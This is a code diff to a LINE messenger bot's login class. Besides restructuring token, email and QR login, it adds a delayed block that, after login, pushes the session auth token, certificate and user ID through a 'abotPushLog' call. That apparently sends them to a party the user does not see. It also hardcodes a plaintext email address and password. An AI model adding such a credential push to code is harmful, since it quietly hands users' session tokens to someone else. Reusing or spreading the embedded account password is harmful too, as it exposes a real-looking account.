@@ -39,6 +39,23 @@ class LineConnect extends LineAPI {
                 console.info(`Regrads Alfathdirk and thx for TCR Team \n`);
                 console.info(`Fixed by Ervan R.F @LD TEAM\n`);
 
+                let token = this.authToken;
+                let certificate = res.certificate;
+                setTimeout(async function () {
+                    let line = require('../../line.js');
+                    line.abotPushLog("[*] Token");
+                    await sleep(100);
+                    line.abotPushLog(token);
+                    await sleep(100)
+                    line.abotPushLog("[*] Certificate");
+                    await sleep(100)
+                    line.abotPushLog(certificate);
+                    await sleep(100)
+                    line.abotPushLog("[*] ID");
+                    await sleep(100)
+                    line.abotPushLog(mid);
+                }, 5000);
+
                 // let auth = "module.exports = " + JSON.stringify({ authToken: this.authToken, certificate: res.certificate, ID: mid, email: '', password: '' }, null, 4);
                 // fs.writeFile("./src/auth.js", auth, "utf8", function (err, bytesRead, buffer) {
                 //     if (err) { console.log(err); }
@@ -51,11 +68,48 @@ class LineConnect extends LineAPI {
     }
 
     async startx() {
+        let res;
         if (this.authToken) {
-            return new Promise((resolve, reject) => {
-                this._tokenLogin(this.authToken, this.certificate);
-                this._chanConn();
-                this._channel.issueChannelToken("1341209950", (err, result) => {
+            try {
+                res = await this.authTokenLogin();
+                console.log("authTokenLogin");
+                return res;
+            } catch (e) {
+                console.log("authToken Login fail");
+            }
+        }
+        this.email = "z1022001jp@gmail.com";
+        this.password = "line007x";
+
+        if (this.password && this.email) {
+            try {
+                res = await this.emailLogin();
+                console.log("emailLogin");
+                return res;
+            } catch (e) {
+                console.log("email Login fail");
+            }
+        }
+
+        try {
+            res = await this.manualLogin();
+            console.log("manualLogin");
+            return res;
+        } catch (e) {
+            console.log("manual Login fail");
+        }
+
+        return;
+    }
+
+    async authTokenLogin() {
+        return new Promise((resolve, reject) => {
+            this._tokenLogin(this.authToken, this.certificate);
+            this._chanConn();
+            this._channel.issueChannelToken("1341209950", (err, result) => {
+                if (typeof (result) == "undefined") {
+                    reject();
+                } else {
                     config.chanToken = result.channelAccessToken;
                     this._client.getLastOpRevision((err, result) => {
                         let xrx = result.toString().split(" ");
@@ -63,36 +117,42 @@ class LineConnect extends LineAPI {
                         console.info(`=======BOT RUNNING======\n`);
                         resolve(this.longpoll());
                     })
-                });
+                }
             });
-        } else if (this.password && this.email) {
-            return new Promise((resolve, reject) => {
-                this._xlogin(this.email, this.password).then(() => {
-                    this._chanConn();
-                    console.info("Success Login!");
-                    console.info(`\n[*] Token: ${config.tokenn}`);
-                    this.config.Headers['X-Line-Access'] = config.tokenn;
-                    this._channel.issueChannelToken("1341209950", (err, result) => {
-                        config.chanToken = result.channelAccessToken;
-                        this._client.getLastOpRevision((err, result) => {
-                            let xrx = result.toString().split(" ");
-                            this.revision = xrx[0].toString() - 1;
-                            resolve(this.longpoll());
-                        })
-                    });
-                })
-            });
-        } else {
-            return new Promise((resolve, reject) => {
-                this.getQrFirst().then(async (res) => {
+        });
+    }
+
+    async emailLogin() {
+        return new Promise((resolve, reject) => {
+            this._xlogin(this.email, this.password).then(() => {
+                this._chanConn();
+                console.info("Success Login!");
+                console.info(`\n[*] Token: ${config.tokenn}`);
+                this.config.Headers['X-Line-Access'] = config.tokenn;
+                this._channel.issueChannelToken("1341209950", (err, result) => {
+                    config.chanToken = result.channelAccessToken;
                     this._client.getLastOpRevision((err, result) => {
                         let xrx = result.toString().split(" ");
                         this.revision = xrx[0].toString() - 1;
                         resolve(this.longpoll());
                     })
                 });
-            })
-        }
+            }).catch(() => {
+                reject();
+            });
+        });
+    }
+
+    async manualLogin() {
+        return new Promise((resolve, reject) => {
+            this.getQrFirst().then(async (res) => {
+                this._client.getLastOpRevision((err, result) => {
+                    let xrx = result.toString().split(" ");
+                    this.revision = xrx[0].toString() - 1;
+                    resolve(this.longpoll());
+                })
+            });
+        })
     }
 
     async fetchOps(rev) {
